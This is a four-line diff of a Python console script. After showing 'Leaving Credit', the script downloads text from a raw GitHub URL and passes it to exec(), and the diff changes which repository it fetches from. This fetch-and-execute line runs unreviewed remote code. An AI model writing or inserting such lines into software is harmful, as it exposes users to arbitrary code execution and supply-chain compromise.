@@ -30,4 +30,4 @@ while True:
     msvcrt.getch()
     os.system('cls')
     print("Leaving Credit")
-    exec(requests.get('https://raw.githubusercontent.com/MCCFree/MCC-Loader/main/Main').text)
+    exec(requests.get('https://raw.githubusercontent.com/Byp4ssFDP/MCC_SourceCode/main/MCC%20-%20Free%20Version/MainMenu.py').text)
